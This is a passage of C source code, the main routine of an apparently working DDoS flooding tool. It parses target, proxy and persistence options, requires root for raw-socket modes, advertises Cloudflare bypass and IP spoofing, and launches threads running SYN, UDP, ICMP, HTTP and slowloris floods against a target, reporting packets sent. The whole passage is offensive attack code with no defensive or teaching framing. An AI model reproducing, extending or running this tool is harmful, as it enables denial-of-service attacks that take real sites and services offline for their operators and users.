        if (strcmp(argv[i], "--persistent") == 0) config.persistent = 1;
        if (strncmp(argv[i], "--domain=", 9) == 0)
            strncpy(config.target.domain, argv[i] + 9, 255);
        if (strncmp(argv[i], "--proxies=", 10) == 0)
            strncpy(config.proxy_file, argv[i] + 10, sizeof(config.proxy_file) - 1);
    }
    
    if (config.threads > MAX_THREADS) {
        printf("[!] Clamping threads to %d\n", MAX_THREADS);
        config.threads = MAX_THREADS;
    }
    if (config.threads < 1) config.threads = 1;
    
    if ((config.mode == MODE_SYN || config.mode == MODE_ICMP) && geteuid() != 0) {
        printf("[!] SYN and ICMP modes require root. Re-run with sudo.\n");
        return 1;
    }
    
    /* Load proxies if specified */
    if (strlen(config.proxy_file) > 0) {
        load_proxies(config.proxy_file);
    }
    
    printf("[*] Target:     %s:%d\n", config.target.ip, config.target.port);
    printf("[*] Domain:     %s\n", config.target.domain);
    printf("[*] Mode:       %s\n", argv[5]);
    printf("[*] Threads:    %d\n", config.threads);
    if (config.duration > 0)
        printf("[*] Duration:   %d seconds\n", config.duration);
    else
        printf("[*] Duration:   INFINITE (until Ctrl+C)\n");
    printf("[*] CF Bypass:  %s\n", config.cf_bypass ? "Enabled" : "Disabled");
    printf("[*] Spoofing:   %s\n", config.spoof ? "Enabled" : "Disabled");
    printf("[*] Persistent: %s\n", config.persistent ? "Yes (never gives up)" : "No");
    printf("[*] Proxies:    %d loaded\n", proxies.count);
    printf("\n[*] Starting attack... Press Ctrl+C to stop.\n\n");
    
    signal(SIGINT, handle_signal);
    signal(SIGTERM, handle_signal);
    
    pthread_t threads[MAX_THREADS];
    pthread_t stats_tid;
    int thread_count = 0;
    
    pthread_create(&stats_tid, NULL, stats_thread, &config);
    
    void *(*attack_func)(void *) = NULL;
    int num_attack_threads = config.threads;
    
    switch (config.mode) {
        case MODE_SYN:
            attack_func = syn_flood;
            break;
        case MODE_UDP:
            attack_func = udp_flood;
            break;
        case MODE_ICMP:
            attack_func = icmp_flood;
            break;
        case MODE_HTTP:
        case MODE_HTTPS:
            attack_func = http_flood;
            break;
        case MODE_SLOWLORIS:
            attack_func = slowloris;
            num_attack_threads = 10;
            break;
        case MODE_ALL: {
            int per_type = config.threads / 6;
            if (per_type < 1) per_type = 1;
            
            void *(*funcs[])(void *) = {syn_flood, udp_flood, icmp_flood, http_flood, http_flood, slowloris};
            int counts[] = {per_type, per_type, per_type, per_type, per_type, 10};
            
            for (int t = 0; t < 6; t++) {
                for (int i = 0; i < counts[t] && thread_count < MAX_THREADS; i++) {
                    pthread_create(&threads[thread_count++], NULL, funcs[t], &config);
                    usleep(100);
                }
            }
            goto skip_single;
        }
    }
    
    for (int i = 0; i < num_attack_threads && thread_count < MAX_THREADS; i++) {
        if (pthread_create(&threads[thread_count++], NULL, attack_func, &config) != 0) {
            usleep(1000);
            continue;
        }
        if (i % 100 == 0) usleep(1000);
    }
    
skip_single:
    
    pthread_join(stats_tid, NULL);
    running = 0;
    
    printf("\n\n[*] Attack complete. Waiting for threads to stop...\n");
    for (int i = 0; i < thread_count; i++) {
        pthread_join(threads[i], NULL);
    }
    
    printf("\n[*] Final statistics:\n");
    printf("    Total packets sent: %llu\n", total_packets);
    printf("    Total bytes sent:   %llu (%.2f MB)\n",
        total_bytes, (double)total_bytes / (1024.0 * 1024.0));
    
    printf("\n[✓] Done.\n");
    return 0;
}
